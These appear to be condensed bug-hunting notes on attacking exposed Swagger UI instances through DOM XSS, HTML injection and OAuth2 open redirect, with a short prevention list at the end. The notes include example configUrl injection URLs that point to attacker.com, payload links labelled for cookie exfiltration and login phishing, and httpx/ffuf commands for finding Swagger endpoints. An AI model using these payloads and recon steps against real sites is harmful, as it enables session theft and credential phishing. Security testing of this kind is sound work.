# : The Dark Side of Swagger UI — XSS, HTML Injection & API Exploitation
- Source: (Jun 24, 2025) — infosecwriteups.com
- DOM XSS, HTML injection, and open redirect in exposed Swagger UI instances

## What is Swagger UI?
Open-source tool for visualizing and interacting with OpenAPI-defined API endpoints. When exposed without proper security controls, becomes a goldmine for client-side attacks.

## Vulnerability Classes

### 1. DOM XSS via configUrl Parameter
Swagger UI accepts `configUrl` or `url` parameters to load external OpenAPI specs. If no domain allowlisting, attacker controls the entire spec → arbitrary JavaScript execution.

```bash
# Test for configUrl injection
https://target.com/swagger?configUrl=https://attacker.com/malicious.json
https://target.com/swagger?url=https://attacker.com/openapi.yaml
```

### 2. HTML Injection (Fake Login Phishing)
If DOMPurify blocks XSS, HTML injection can still render fake login forms under the legitimate domain.

### 3. Open Redirect via OAuth2 Authorize Button
Supply crafted `authorizationUrl` in the spec → clicking Authorize redirects victim to attacker domain.

## Testing Payloads
```
# XSS test
?configUrl=https://example.com/payloads/swagger/xsstest.json

# Cookie exfiltration
?configUrl=https://example.com/payloads/swagger/xsscookie.json

# Login phishing
?configUrl=https://example.com/payloads/swagger/login.json

# Open redirect
?configUrl=https://example.com/payloads/swagger/rlogin.json
```

## Discovery Commands
```bash
# Find Swagger UI endpoints
httpx -l subs.txt -path /swagger -silent -mc 200
httpx -l subs.txt -path /swagger-ui -silent -mc 200
httpx -l subs.txt -path /api-docs -silent -mc 200
httpx -l subs.txt -path /api/swagger -silent -mc 200

# FFUF for Swagger paths
ffuf -w swagger_paths.txt -u https://target.com/FUZZ -mc 200 -fs 0

# Check for Swagger via title
httpx -l subs.txt -silent -title | grep -i "swagger\|swagger-ui"

# Jamf Pro specific (Apple ecosystem)
httpx -l subs.txt -path /api-docs -silent -mc 200
```

## Detection
Look for these in page source:
- `SwaggerUIBundle`
- `swagger-ui.css`
- `swagger-ui-standalone-preset.js`
- Title contains "Swagger UI"

## Impact Escalation
1. HTML injection → fake login form → credential harvesting
2. Open redirect → phishing chain
3. DOM XSS → session theft → account takeover
4. Resource injection → malware delivery
5. IFrame injection → clickjacking

## Prevention
- Validate configUrl/url server-side with domain allowlisting
- Require HTTPS for remote configs
- Implement strong Content Security Policy (CSP)
- Authenticate Swagger UI in production
- Disable configUrl parameter if not required
